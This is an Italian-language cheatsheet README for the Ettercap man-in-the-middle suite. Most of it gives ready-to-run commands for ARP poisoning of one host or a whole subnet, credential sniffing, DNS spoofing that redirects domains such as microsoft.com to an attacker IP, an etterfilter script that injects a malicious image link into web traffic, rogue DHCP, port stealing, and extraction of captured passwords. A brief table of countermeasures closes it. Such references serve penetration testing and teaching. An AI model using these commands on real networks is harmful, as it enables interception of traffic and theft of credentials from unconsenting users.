<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Cheatsheet di Ettercap

[Ettercap](https://www.ettercap-project.org/) è una suite completa per attacchi man-in-the-middle (MITM) alle reti locali (LAN). È dotato di sniffing di connessioni live, filtraggio dei contenuti al volo, dissezione attiva e passiva di molti protocolli e supporto per avvelenamento ARP, reindirizzamenti ICMP, spoofing DHCP e furto di porte.

---

## Sommario

- [Architettura e modalità di base](#architettura-core--modalità)
- [Installazione e configurazione rapida](#installazione--configurazione rapida)
- [Avvelenamento e sniffing ARP](#avvelenamento-arp--sniffing)
- [Attacchi di spoofing DNS](#attacchi-spoofing-dns)
- [Filtro pacchetti personalizzato (`etterfilter`)](#custom-packet-filtering-etterfilter)
- [Spoofing DHCP e furto di porte](#dhcp-spoofing--port-stealing)
- [Logging ed estrazione dei pacchetti](#logging--packet-extraction)
- [Rilevamento difensivo e contromisure](#rilevamento-difensivo--contromisure)

---

## Architettura e modalità principali

Ettercap supporta più modalità di esecuzione:
- **`-T` (modalità testo):** Output terminale leggero e senza maledizioni, ideale per scripting e automazione headless.
- **`-C` (modalità Curses):** Interfaccia utente terminale basata su Ncurses per operazioni interattive senza X11.
- **`-G` (modalità GTK):** Interfaccia grafica completa.
- **`-D` (modalità Demone):** Funziona silenziosamente in background.

Sintassi della specifica di destinazione:
```text
/MAC/IPs/IPv6/PORTs
```
- I target possono essere separati da virgole o intervalli IP: `//` corrisponde a tutto.
- Esempio: `/192.168.1.50/` ha come target l'IP `192.168.1.50` su tutte le porte.
- Esempio: `//80,443/` ha come target tutti gli host sulle porte 80 e 443.

---

## Installazione e configurazione rapida
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y ettercap-text-only ettercap-graphical

# Arch Linux / BlackArch
sudo pacman -S ettercap

# Enable IP forwarding on the host system
sudo sysctl -w net.ipv4.ip_forward=1
```
Verifica i percorsi dei file di configurazione:
- `/etc/ettercap/etter.conf`: configurazione della rete principale e della rimozione dei privilegi.
- `/etc/ettercap/etter.dns`: tabella di ricerca dei record di spoofing DNS.

---

## Avvelenamento e sniffing ARP

### 1. Avvelenamento ARP remoto bidirezionale
Tabelle Poison ARP tra una workstation di destinazione e il gateway di rete:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-T`: modalità testo.
- `-q`: modalità silenziosa (riduce la verbosità, visualizza solo le credenziali acquisite).
- `-i eth0`: interfaccia di rete di ascolto e iniezione.
- `-M arp:remote`: esegue l'avvelenamento ARP man-in-the-middle bidirezionale.

### 2. Sniffing dell'intera sottorete (unidirezionale/trasmissione)
Poison tutti gli host sulla sottorete rispetto al gateway predefinito:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote // /192.168.1.1//
```
### 3. Solo sniffing passivo
Cattura le credenziali in testo normale che passano attraverso l'host corrente senza spoofing ARP:
```bash
sudo ettercap -T -q -i eth0
```
---

## Attacchi di spoofing DNS

Ettercap include plugin integrati, incluso `dns_spoof`.

### Passaggio 1: configurare `/etc/ettercap/etter.dns`
Aggiungi carattere jolly o reindirizzamento del dominio specifico:
```text
# Redirect target domain to attacker machine
target.corp.local      A   192.168.1.100
*.target.corp.local    A   192.168.1.100
microsoft.com          A   192.168.1.100
```
### Passaggio 2: avvia Ettercap con il plugin DNS
```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-P dns_spoof`: attiva il plugin di spoofing DNS.
- Le query DNS intercettate che corrispondono a `etter.dns` restituiscono l'IP dell'aggressore.

---

## Filtraggio pacchetti personalizzato (`etterfilter`)

Ettercap consente l'ispezione dei pacchetti in tempo reale e la modifica del carico utile utilizzando script di filtro personalizzati.

### 1. Scrivi script filtro (`replace_img.filter`)
```text
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    replace("img src=", "img src=\"http://192.168.1.100/evil.jpg\" ");
    msg("[*] Injected malicious image link!\n");
}
```
### 2. Compila il filtro con `etterfilter`
```bash
etterfilter replace_img.filter -o replace_img.ef
```
### 3. Esegui con Filtro
```bash
sudo ettercap -T -q -i eth0 -F replace_img.ef -M arp:remote /192.168.1.50// /192.168.1.1//
```
---

## Spoofing DHCP e furto di porte

### 1. Attacco non autorizzato al server DHCP
Rispondi più velocemente del server DHCP legittimo per assegnare gateway non autorizzati e indirizzi DNS:
```bash
sudo ettercap -T -i eth0 -M dhcp:192.168.1.200-250/255.255.255.0/192.168.1.1
```
- Sintassi: `dhcp:<ip_pool_start-end>/<netmask>/<dns_ip>`

### 2. Attacco furto di porte (flooding di switch/abuso di tabelle CAM)
Ruba traffico su reti commutate in cui l'avvelenamento da ARP è bloccato o avvisato:
```bash
sudo ettercap -T -q -i eth0 -M port /192.168.1.50// /192.168.1.1//
```
---

## Registrazione ed estrazione di pacchetti

### Salva sessioni grezze catturate
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1// -w capture.pcap -L ettercap_log
```
- `-w capture.pcap`: scrive i dati grezzi del pacchetto pcap.
- `-L ettercap_log`: scrive registri di testo sezionati leggibili dall'uomo.

### Converti log binari con `etterlog`
```bash
# Print captured credentials and passwords
etterlog -p ettercap_log.eci

# Extract traffic in pcap format
etterlog -c -F TCP:192.168.1.50:80 ettercap_log.ecp -w http_session.pcap
```
---

## Rilevamento difensivo e contromisure

| Vettore | Meccanismo di rilevamento e difesa |
|---|---|
| **Spoofing ARP** | Abilitare l'ispezione ARP dinamica (DAI) sugli switch gestiti; ispezionare `arp -a` per MAC duplicati; eseguire `arpwatch` o `arpon`. |
| **Spoofing DNS** | Applica DNSSEC, DoH (DNS-over-HTTPS) o DoT (DNS-over-TLS). |
| **Spoofing DHCP** | Abilita lo snooping DHCP sugli switch per designare le porte di uplink attendibili. |
| **Rubare il porto** | Implementa il controllo di accesso alla rete (NAC) 802.1X e la sicurezza delle porte con limiti MAC per porta dello switch. |